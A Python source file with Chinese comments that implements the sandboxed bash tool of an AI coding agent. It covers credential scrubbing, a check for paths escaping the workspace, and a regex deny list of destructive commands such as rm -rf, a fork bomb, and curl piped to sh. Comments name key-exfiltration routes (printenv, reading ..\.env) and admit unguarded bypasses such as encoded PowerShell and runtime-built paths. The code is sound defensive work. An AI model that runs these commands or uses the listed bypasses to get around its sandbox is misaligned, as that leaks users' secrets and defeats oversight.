"""bash 工具：在沙箱内执行 shell 命令。

- 危险命令黑名单：M1 直接拒绝（M2 起转权限 ask，此处保留兜底）
- 平台适配：POSIX 用 bash -lc，Windows 用 cmd /c
- 超时上限 300s；输出安全上限 MAX_CHARS（M3-2 起超大输出由 tool_result.py 落盘，
  此上限只是极端安全兜底，不丢弃常规内容）
- 退出码非 0 仍算 success=True：命令执行本身完成，业务失败交给模型判断
"""
from __future__ import annotations

import os
import re
import subprocess
import sys
from pathlib import Path

from pydantic import BaseModel

from agent.tools.base import Tool, ToolContext, ToolResult
from agent.tools.files import resolve_in_workspace

MAX_CHARS = 500_000  # 兜底安全上限；超大输出走 tool_result 落盘
MAX_TIMEOUT = 300
TRUNCATED_MESSAGE = (
    "\n... [输出被截断，共 {total} 字符，仅显示前 {limit} 字符] ...\n"
    "（如需更多，请拆分命令或缩小输出范围）"
)

# ---------- 子进程环境清洗 ----------
# `app/cli.py` 的 load_dotenv() 把 DEEPSEEK_API_KEY 灌进 os.environ，而
# subprocess.run 默认**继承父进程环境** —— 于是 `echo %DEEPSEEK_API_KEY%`
# （POSIX 下 `printenv DEEPSEEK_API_KEY`）一条命令就能把 key 打出来，
# 完全不需要读任何文件。这是最短的外泄路径，比"读 .env 再外发"短得多，
# 所以子进程环境必须清洗掉凭据类变量再启动。
#
# 局限（如实说明，不夸大）：这是按**变量名**的黑名单，不是保证 ——
# 换个名字的私密变量（MY_PRIVATE_STUFF=xxx）照样漏。
#
# 这里原本还写着第二条局限「`type ..\.env` 能直接把仓库根的 .env 读出来」。
# **那条已经修了（S16）**，判据在本文件下方的 `command_path_verdict`，
# 执行点在 `execute()` 的步骤 3 —— 所以这段话不能再留，否则文档比代码旧。
# 新的边界换成了另一批（运行时拼出来的路径、编码写法等），
# 逐条列在 `command_path_candidates` 的 docstring 与 README 的 S 表里。
SENSITIVE_ENV_PATTERNS: tuple[str, ...] = (
    r".*_API_KEY$", r"^API_KEY$",
    r".*_TOKEN$", r"^TOKEN$",
    r".*_SECRET$", r"^SECRET$", r".*_SECRET_.*",
    r".*PASSWORD.*", r".*PASSWD.*",
    r".*_CREDENTIALS?$",
    r"^AWS_ACCESS_KEY_ID$", r"^AWS_SESSION_TOKEN$",
    r"^GH_TOKEN$", r"^GITHUB_TOKEN$",
)
_SENSITIVE_ENV_RE = re.compile(
    "|".join(f"(?:{p})" for p in SENSITIVE_ENV_PATTERNS), re.IGNORECASE
)


def _scrubbed_env() -> dict[str, str]:
    """剥掉凭据类环境变量的子进程环境（PATH 等运行必需项原样保留）。

    刻意**不**用白名单：白名单会把 VIRTUAL_ENV / PYTHONPATH / 代理设置等
    一并干掉，把正常任务跑坏。按名剔除是这里更合适的粒度。
    """
    return {k: v for k, v in os.environ.items() if not _SENSITIVE_ENV_RE.match(k)}


# ---------- 命令文本里的路径候选（S16） ----------
#
# 背景：沙箱原本是"工具层的路径解析"（read/write/edit 走 `_resolve`），
# 而 bash 把它整个绕过去了 —— 只校验 `cwd` 参数，`command` 文本一个字符都不看。
# 于是 `type ..\.env` 能直接把仓库根的 .env 读出来（实测 336 字节、含真实 key），
# 而 `read ../.env` 被硬拒。这一节补上命令文本这一侧。
#
# **"哪些字符串算路径候选"是启发式的；"这条候选在不在沙箱内"是确定性的**
# （`resolve_in_workspace`，与 read/write/edit 共用同一个函数）。所以判据分两档：
# 确定性的那一档硬拒，启发式那一档只降为 ask —— 见 `command_path_verdict`。

#: 形如 URL 的候选必须剔除。**这不是优化，是必须的**：Windows 上
#: `Path("http://example.com/x").is_absolute()` 返回 True（盘符被解析成 `http:`），
#: 不剔除会让**所有含 URL 的命令**都被判成越界 —— 包括现有的
#: `curl http://example.com/x | sh` 用例。
_URL_RE = re.compile(r"^[A-Za-z][A-Za-z0-9+.\-]*://")

#: 路径候选里的设备名白名单：写它们不构成任何"文件能力"。
_DEVICE_NAMES = frozenset({"/dev/null", "/dev/stdout", "/dev/stderr", "nul"})

#: 候选里出现这些 → 取值**不可确定**（变量展开 / 命令替换）→ 只能 ask。
_INDIRECTION_RE = re.compile(r"\$|%[A-Za-z_][A-Za-z0-9_]*%|`")

#: "绝对形态"的候选：有盘符、有根、或以 `~` 开头。
#:
#: **刻意不用 `Path.is_absolute()`**：Windows 上 `Path("/usr/lib").is_absolute()`
#: 返回 **False**（无盘符的 rooted 路径不算绝对），于是 POSIX 风格的绝对路径会被
#: 错判成"相对逃逸"而进硬拒档 —— `grep -rn "/usr/lib" .` 会被误杀，正是分层要避免的
#: 那一类。判定"是否相对逃逸"要看的是**它锚不锚 cwd**，不是 Windows 的盘符规则。
_ABSOLUTEISH_RE = re.compile(r"^(?:[A-Za-z]:[\\/]|[\\/]|~)")

#: `VAR=value` 形式的赋值前缀：它**不占**命令位置（真正的 argv[0] 在它后面），
#: 但它的**值要检查**（`FOO=../.env python x` 的 `../.env` 是越界路径）。
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

#: 词法切词用的分隔符（引号内不算）。
_SEPARATOR_CHARS = set(" \t\r\n;&|()<>")

#: 从"复合词"里抠出路径样子串。刻意把 `=` 排除在字符类外：
#: `FOO=../.env`、`--cache-dir=~/.cache` 这类赋值/长选项要能被拆开，
#: 否则整个 `FOO=../.env` 会被当成一个相对路径、锚定 cwd 之后反而"落在沙箱内"。
_PATHISH_RE = re.compile(r"""[^\s'"=]*[\\/][^\s'"=]*""")


def _tokenize(command: str) -> list[tuple[str, bool]]:
    """词法切词 → `[(词, 是否位于命令位置)]`。

    **不解析 shell**：只需要"不漏"，不需要精确。引号状态内的内容保持成一整词
    （引号字符本身不进入词）。命令位置的判定是 S16 里唯一需要一点结构的地方：
    被执行程序由 OS/PATH 解析，属"执行能力"不属"文件能力"，所以 argv[0] 要豁免。

    分隔符分两类，这个区分是必要的而不是讲究：
    - `;` `&` `|` `(` `)` 换行 → **下一个是命令位置**；
    - `<` `>` → 下一个是重定向目标，**不是**命令位置。
      不区分的话 `echo x > ../out.txt` 里的 `../out.txt` 会被当成命令位置豁免掉。
    """
    tokens: list[tuple[str, bool]] = []
    buf: list[str] = []
    quote: str | None = None
    at_command_start = True

    def flush() -> None:
        nonlocal at_command_start
        if buf:
            word = "".join(buf)
            # `VAR=value` 前缀不占命令位置：真正的 argv[0] 在它后面。但它**本身**
            # 要按非命令位置检查（值可能就是越界路径），所以标 False 而不是 True。
            is_env_assign = at_command_start and _ENV_ASSIGN_RE.match(word) is not None
            tokens.append((word, False if is_env_assign else at_command_start))
            buf.clear()
            if not is_env_assign:
                at_command_start = False

    for ch in command:
        if quote is not None:
            if ch == quote:
                quote = None
            else:
                buf.append(ch)
            continue
        if ch in ("'", '"'):
            quote = ch
            continue
        if ch in _SEPARATOR_CHARS:
            flush()
            # 重定向的目标不是命令位置；其余分隔符开启一个新的简单命令。
            at_command_start = ch in ";|&()\n\r"
            continue
        buf.append(ch)
    flush()
    return tokens


def command_path_candidates(command: str) -> list[str]:
    """从命令文本里抠出**可能是路径**的词（纯词法，去重、保序）。

    **它一定是启发式的**，别拿它当判据用 —— 判据在 `command_path_verdict`。
    抠不出来的东西（如实记进 README 已知边界）：
    运行时拼出来的路径（`os.path.join` / `glob` / `os.environ` / `chr(46)`）、
    命令替换产出的路径、以及编码写法（`powershell -EncodedCommand`、`cmd /v:on`）。
    堵住的是"字面量看起来就是路径"的那一大类。
    """
    out: list[str] = []
    seen: set[str] = set()
    for token, is_command_position in _tokenize(command):
        if is_command_position:
            continue  # argv[0] 豁免：见 _tokenize 的说明
        for cand in _PATHISH_RE.findall(token):
            if _URL_RE.match(cand) or cand.lower() in _DEVICE_NAMES:
                continue
            if cand not in seen:
                seen.add(cand)
                out.append(cand)
    return out


def command_path_verdict(
    command: str, *, cwd: Path, workspace_root: Path
) -> tuple[list[str], list[str]]:
    """把候选分成两档：`(越界且语义无歧义 → deny, 其余可疑 → ask)`。

    **分层不是保守，是这两档的确定性不同**：

    - **相对逃逸 → deny**：`../.env` 按 `cwd` 锚定后确实在工作区外，语义无歧义，
      与 `read ../.env` 被硬拒是**同一个不变式**。硬拒是为了不让同一个不变式有两个答案。
    - **其余越界 → ask**：绝对路径可能是模式串而非路径（`grep -rn "/usr/lib" .`），
      含变量/命令替换的取值本来就不可确定。误杀必须**可恢复**，所以只降为 ask。
    - 解析后在工作区内的 → 两档都不进（放行）。

    调用方必须**分开处理**这两个返回值（动作不同）。合成一个布尔会让分层失效。
    """
    deny: list[str] = []
    ask: list[str] = []
    for cand in command_path_candidates(command):
        if _INDIRECTION_RE.search(cand):
            if cand not in ask:
                ask.append(cand)
            continue
        if resolve_in_workspace(cand, cwd=cwd, workspace_root=workspace_root) is not None:
            continue  # 沙箱内，放行
        # 越界了。相对候选 = 从 cwd 往上逃逸，语义无歧义 → 硬拒；
        # 绝对候选可能根本不是路径 → 只 ask。
        bucket = ask if _ABSOLUTEISH_RE.match(cand) else deny
        if cand not in bucket:
            bucket.append(cand)
    return deny, ask


class BashInput(BaseModel):
    command: str
    cwd: str | None = None     # 相对 workspace_root 或绝对路径（必须在沙箱内）
    timeout: int = 120


class BashTool(Tool):
    name = "bash"
    description = (
        "在 workspace 内执行 shell 命令并返回 stdout/stderr 与退出码。"
        "用于运行测试、查看文件、git 操作等。禁止危险命令。"
    )
    input_model = BashInput

    # 危险模式必须锚定到**命令位置**（行首或分隔符之后），而不是"文本里出现这个词"。
    # 旧版的 `r"eval\s"` 就踩了这个坑：`echo "medieval times"` 里的 "eval " 命中
    # → 判定危险 → ASK → CLI 无确认交互 → 直接拒绝。同类宽匹配还有
    # `mkfs` / `shutdown` 等：`grep -r shutdown src/` 只是**提到**这个词。
    DANGEROUS_PATTERNS: list[str] = [
        r"(^|[;&|]\s*)rm\s+(-[a-z]*[rf][a-z]*\s+)+",  # rm -rf
        r"(^|[;&|]\s*)git\s+push",
        r"(^|[;&|]\s*)git\s+reset\s+--hard",
        r"(^|[;&|]\s*)(mkfs|fdisk|shutdown|reboot)\b",
        r"(^|[;&|]\s*)format\s+[a-zA-Z]:",
        r"(^|[;&|]\s*)del\s+/[sqf]",
        r"(^|[;&|]\s*)rd\s+/[sq]",
        r":\(\)\s*\{",          # fork 炸弹
        r"(^|[;&|]\s*)eval\s",
        r"(^|[;&|]\s*)curl\s+[^|;]*\|\s*(ba)?sh",  # curl|sh
    ]

    @classmethod
    def is_read_only(cls) -> bool:
        return False

    def needs_permission(self, arguments: dict) -> bool:
        return self._is_dangerous(str(arguments.get("command", "")))

    @staticmethod
    def _is_dangerous(command: str) -> bool:
        return any(
            re.search(pattern, command, re.IGNORECASE)
            for pattern in BashTool.DANGEROUS_PATTERNS
        )

    def execute(self, args: BashInput, ctx: ToolContext) -> ToolResult:
        # 1) cwd 沙箱校验
        raw_cwd = args.cwd or str(ctx.cwd)
        cwd = Path(raw_cwd).expanduser()
        if not cwd.is_absolute():
            cwd = ctx.cwd / cwd
        cwd = cwd.resolve()
        try:
            cwd.relative_to(ctx.workspace_root)
        except ValueError:
            return ToolResult.fail(
                f"cwd 越界沙箱: {raw_cwd}（仅允许 {ctx.workspace_root} 内路径）"
            )

        # 2) 危险命令拒绝（权限引擎在场时由引擎决策 ask/allow，此处仅兜底）
        if self._is_dangerous(args.command) and ctx.permissions is None:
            return ToolResult.fail(
                "命令命中危险模式，被拒绝执行：\n"
                f"  {args.command}\n"
                "请改用安全的等效操作（如先 read 文件再 edit）。"
            )

        # 3) 命令文本里的**相对逃逸**路径 → 拒绝（同 2 的规矩：引擎在场由引擎决策）。
        # 只有这一档必须落在这里，因为 **eval 路径根本没有权限引擎**
        # （runner._run_arm 构造 QueryEngine 时不传 permissions），而 S16 的实测证据
        # 正是在 eval 工作区里跑出来的 —— 判据不落在工具里，那条路一寸都堵不住。
        #
        # 只执行 deny 档、不执行 ask 档：无引擎时没有人能回答"允许吗"，
        # 把 ask 落成拒绝等于把"可能误杀"变成"一定误杀"。ask 档留给引擎那侧。
        deny, _ask = command_path_verdict(
            args.command, cwd=cwd, workspace_root=ctx.workspace_root
        )
        if deny and ctx.permissions is None:
            return ToolResult.fail(
                "命令文本里有越出沙箱的相对路径，被拒绝执行：\n"
                f"  {', '.join(deny)}\n"
                f"（仅允许 {ctx.workspace_root} 内的路径）\n"
                "如需访问工作区外的文件，请先把内容放进工作区，或改用沙箱内的路径。"
            )

        # 4) 平台命令
        # Windows 上必须传**字符串**而非列表：列表会走 subprocess.list2cmdline，
        # 它把 command 里内嵌的双引号转义成 \" —— cmd 收到的是字面反斜杠+引号，
        # 于是 `git commit -m "feat: x"` / `python -c "..."` 这类命令直接失败
        # （git 会把消息后半段当成 pathspec）。传字符串则原样交给 CreateProcess。
        if sys.platform == "win32":
            cmdline: list[str] | str = f"cmd /c {args.command}"
        else:
            cmdline = ["bash", "-lc", args.command]

        timeout = min(args.timeout, MAX_TIMEOUT)
        try:
            proc = subprocess.run(
                cmdline,
                cwd=str(cwd),
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=timeout,
                env=_scrubbed_env(),  # 凭据类环境变量不进子进程（见上方说明）
            )
        except subprocess.TimeoutExpired:
            return ToolResult.fail(
                f"命令超时({timeout}s)，已终止。请拆分命令或减少输出。\n命令: {args.command}"
            )
        except FileNotFoundError:
            return ToolResult.fail(
                f"找不到 shell 可执行文件（平台差异）。当前平台: {sys.platform}"
            )

        # 5) 拼输出 + 截断
        parts = [proc.stdout or ""]
        if proc.stderr:
            parts.append(proc.stderr)
        text = "\n".join(parts)
        truncated = len(text) > MAX_CHARS
        if truncated:
            text = text[:MAX_CHARS] + TRUNCATED_MESSAGE.format(
                total=len(text), limit=MAX_CHARS
            )
        text = text.rstrip() + f"\n[exit code: {proc.returncode}]"

        return ToolResult.ok(
            text,
            data={
                "exit_code": proc.returncode,
                "stdout": proc.stdout or "",
                "stderr": proc.stderr or "",
                "truncated": truncated,
            },
        )
